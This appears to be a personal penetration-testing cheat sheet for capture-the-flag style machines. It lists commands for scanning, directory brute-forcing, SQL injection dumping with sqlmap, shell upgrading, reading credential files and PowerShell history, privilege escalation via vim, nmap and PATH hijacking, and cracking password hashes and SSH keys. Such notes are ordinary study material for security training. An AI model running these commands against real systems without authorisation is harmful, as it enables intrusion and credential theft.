## Reconaissance

##### nmap scanning

```bash
nmap -Pn -p- -T4 {ip}
nmap -A -p<ports> -T4 {ip}
```

##### directory enumeration
```bash
gobuster dir -u {ip} -w {path_wordlist} -t {no. threads} -x {strings, pdf, php, txt, etc.}
dirbuster #opens dirbuster window
```

##### checking for sql injections
```bash
sqlmap -u {weburl, http://10.10.60.252/administrator.php>} --forms --dump --dbms=mysql
sqlmap --tables -T users --dump
```

##### enum4linux (if may samba port open)
```bash
enum4linux -a <MACHINE IP>
```

## Foothold

##### connecting ssh
```bash
ssh {user}@{ip} -p {port} 
```

##### putting files in the target system
```bash
scp {path to linenum} {user}@{host}:{path} #Example: scp /opt/LinEnum.sh pingu@10.10.10.10:/tmp
```



## Foothold Enumeration

###### getting an interactive shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```
##### always check what kind of user you landed on
```bash
whoami
id
```

##### check files of user (and group) you landed on

```bash
find / -type f {-group/-user} {group/user} 2>/dev/null
```

##### check console history of windows terminal

```bash
type C:\Users\{user}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

##### if from www-data, check db credentials
```bash
cat /var/www/html/cdn-cgi/login/db.php
```

##### check sudo-able commands
```bash
sudo -l
```
##### check root processes
```bash
find / -perm +6000 2>/dev/null | grep '/bin/'
```

###### pivoting to other users (if you have password)
```bash
su {user name}
```



## Privelege Escalation 

###### running bash in vim (if vim is runnable)
```
:shell 
```

##### running bash in nmap (if nmap is runnable)
```
nmap --interactive
!sh
```

##### changing PATH
```bash
export PATH=/tmp:$PATH
```

## Misc

##### use gdb in checking binary files
##### pwn commandd to check excessive input
##### pwn command to check how many excessive input is actually needed to overwrite certain address

##### in cracking hashes
```bash
hashcat -m {hash algo mode} {hash file path} {wordlist path}
```
https://hashcat.net/wiki/doku.php?id=example_hashes

##### in cracking ssh passkeys (given public and private keys)
```bash
python ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash -wordlist=rockyou.txt
```
https://www.abhizer.com/crack-ssh-with-john/

## Reminders

##### Root Reverse Shell Cheat sheet
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
